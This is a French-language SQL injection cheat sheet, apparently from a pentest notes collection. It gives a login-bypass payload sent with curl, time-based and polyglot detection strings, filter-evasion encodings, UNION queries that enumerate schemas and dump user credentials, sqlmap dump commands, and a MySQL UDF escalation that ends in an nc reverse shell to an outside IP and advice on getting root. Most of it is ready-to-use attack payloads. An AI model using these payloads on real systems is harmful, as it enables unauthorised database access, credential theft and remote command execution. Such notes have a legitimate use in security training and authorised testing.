

<!--- category: sqli --->
<!--- id: intro --->
<!--- title: SQLi --->
<!--- keywords:  --->
## SQLi




<!--- category: sqli --->
<!--- id: principe --->
<!--- title: Principe --->
<!--- keywords:  --->
## Principe

Injecter des commandes SQL dans les paramêtres pour réécrire la requête.
```
SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
```

Méthode : fermer la ', élargir la requête avec OR 1=1, ajouter des valeurs avec UNION, commenter la fin de la requête avec # ou -- -
```
Valeur des paramètres envoyés :
USER=admin' OR 1=1 -- -
PASSWORD=ferrari

Requète SQL obtenue:
SELECT * FROM user WHERE login='admin' OR 1=1 -- - and password='ferrari';
```

Envoyer les paramètres avec Curl:
```
curl http://target/login.pgp?login=admin' OR 1=1 -- -&password=ferrari
```




<!--- category: sqli --->
<!--- id: sqli-fun --->
<!--- title: Les Exploits de maman --->
<!--- keywords:  --->
## Les Exploits de maman

<img src='https://imgs.xkcd.com/comics/exploits_of_a_mom.png'> 
- Bonjour, c'est l'école de votre fils. Nous avons des petits soucis informatiques.
- A-t-il cassé quelque chose ?
- D'une certaine manière
- Avez vous réellement donné comme prénom à votre fils: Robert'); DROP TABLE Students; -- ?
- Oh, oui, on le surnomme notre petit Bobby Tables
- Nous venons de perdre l'intégralité des données sur les étudiants. J'espère que vous êtes satisfaite.
- Et moi j'espère que vous avez appris à filtrer vos données utilisateurs





<!--- category: sqli --->
<!--- id: sql-mysql --->
<!--- title: MySQL/MariaDB - Commandes --->
<!--- keywords:  --->
## MySQL/MariaDB - Commandes

Connect to a remote mysql database:
```
mysql -u admin --host=10.10.12.10 : without password
mysql -u admin --host=10.10.12.10 -padmin : with password
```

Usefull commands:
```
SELECT @@version;
SELECT user();
SHOW Databases;
USE database;
SHOW tables;
SELECT * from table;
```




<!--- category: sqli --->
<!--- id: detect --->
<!--- title: Détecter une SQLi --->
<!--- keywords:  --->
## Détecter une SQLi

Vous êtes devant une page web contenant un formulaire de login/register/search,...
Saisissez des fermetures de string ' ou " pour générer une erreur.<br/>
Injecter un sleep et remarquer un retard de la réponse.
```
admin' and sleep(5) and '1'='1
admin" and sleep(5) and "1"="1
```




<!--- category: sqli --->
<!--- id: detect --->
<!--- title: Détecter une SQLi : Polyglot --->
<!--- keywords:  --->
## Détecter une SQLi : Polyglot

Un polyglot est une séquence capable de s'adapter à de nombreux scénario
```
/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
```




<!--- category: sqli --->
<!--- id: limit --->
<!--- title: Selectionner une seule entrée --->
<!--- keywords:  --->
## Selectionner une seule entrée

Généralement les développeurs prennent la première entrée. Mais parfois ils vérifient qu'il n'y en a bien qu'une seule.
```
admin' or 1=1 LIMIT 1 -- -
```




<!--- category: sqli --->
<!--- id: simplefilter --->
<!--- title: Contourner les filtres simple --->
<!--- keywords:  --->
## Contourner les filtres simple

Les développeurs filtrent parfois de caractères ou des mot:
```
Space => Tab %09, Newline %A0, /**/
AND   => && %26%26
OR    => ||
```




<!--- category: sqli --->
<!--- id: union --->
<!--- title: Injecter des valeurs avec un UNION --->
<!--- keywords:  --->
## Injecter des valeurs avec un UNION

Quand la requête sert à afficher des entrées (ex: liste d'objets), on peut ajouter des valeurs avec un UNION.<br/>
Il faut commencer par identifier le nombre d'entrées qu'attend le select<br/>
```
SELECT id, name, desc, price FROM stock WHERE name=[NAME]
```

Methode 1: ORDER BY
```
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 1-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 2-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 3-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 4-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 5-- - : Erreur
=> 4 entrées
```

Methode 2: SELECT
```
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1 : Erreur
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2 : Erreur
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3 : Erreur
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3,4 : Ok
=> 4 entrées
```




<!--- category: sqli --->
<!--- id: uniontablenames --->
<!--- title: UNION: Table names --->
<!--- keywords:  --->
## UNION: Table names

```
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -  
```




<!--- category: sqli --->
<!--- id: uniontablecolumnnames --->
<!--- title: UNION: Table columns names --->
<!--- keywords:  --->
## UNION: Table columns names

```
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -
```




<!--- category: sqli --->
<!--- id: uniontablecolumnnames --->
<!--- title: UNION: Dump table --->
<!--- keywords:  --->
## UNION: Dump table

```
UNION SELECT concat(name,':',pass),1 FROM users; -- -
```




<!--- category: sqli --->
<!--- id: sqlmap --->
<!--- title: SqlMap --->
<!--- keywords:  --->
## SqlMap

SQLi sur les paramètres d'un GET
```
$ sqlmap -u 'http://10.10.10.129/sqli/example1.php?name=root' --dbs --banner
```

SQLi sur les paramètres d'un POST. <br/>
Intercepter la requète avec Burp, et la sauver dans un fichier login.txt
```
$ sqlmap -r login.txt --dbs --banner
  -p name : forcer le paramètre à tester
```
 
Lister les tables, puis dumper une table
```
$ sqlmap -r login.txt -D jetadmin --tables
$ sqlmap -r login.txt -D jetadmin -T users --dump
```




<!--- category: sqli --->
<!--- id: mysqludf --->
<!--- title: MySQL: UDF User Defined Function --->
<!--- keywords:  --->
## MySQL: UDF User Defined Function

Compiler une librairie UDF contenant le fonction sys_exec()<br/>
L'uploader sur le serveur. La déclarer. La fonction sys_exec() permet de lancer des commandes.
```
# Tested with : mysql 5.5.60-0+deb8u1
# Create a 'User Defined Function' calling C function 'system'
# Use pre-compiled 32 or 64 depending on target.
# Copy file to /tmp
create database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname 'lib_mysqludf_sys.so';
select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');

select sys_exec('/bin/sh');
after bash access, 'bash –p' or 'sudo su'
```


